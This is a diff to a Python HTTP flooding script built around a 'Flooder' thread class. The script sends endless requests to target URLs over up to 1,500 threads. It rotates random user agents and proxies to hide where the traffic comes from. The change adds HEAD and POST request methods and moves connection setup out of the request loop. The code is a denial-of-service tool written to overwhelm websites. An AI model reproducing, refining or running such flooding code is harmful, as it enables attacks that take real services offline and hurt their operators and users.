@@ -10,10 +10,10 @@ import string
 
 # TODO вынести это в config.txt
 referrer = ""
-request_methods = ["GET"]
+request_methods = ["GET", "HEAD", "POST"]
 thread_limit = 1500
 append_rand_string_to_url = False
-min_timeout = 0
+min_timeout = 20
 max_timeout = 30
 # Global variables
 user_agents = []  # in file 'useragents.txt'
@@ -29,18 +29,18 @@ class Flooder(threading.Thread):
     def run(self):
         try:
             cur_url = urllib.parse.urlparse(random.choice(url))
+            if len(proxies) == 0:  # setting direct connection here
+                connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout, max_timeout))
+                url_str = cur_url.path + cur_url.params + cur_url.query
+            else:  # connect via random proxy
+                connection = http.client.HTTPConnection(random.choice(proxies))
+                url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
             while True:
                 cur_header = {
                     "User-agent": random.choice(user_agents),
                     "Referrer": referrer,
                     "Accept-Encoding": "gzip,deflate"
                 }
-                if len(proxies) == 0:  # setting direct connection here
-                    connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout, max_timeout))
-                    url_str = cur_url.path + cur_url.params + cur_url.query
-                else:  # connect via random proxy
-                    connection = http.client.HTTPConnection(random.choice(proxies))
-                    url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
                 if not append_rand_string_to_url:
                     connection.request(method=random.choice(request_methods), url=url_str, headers=cur_header)
                 else:
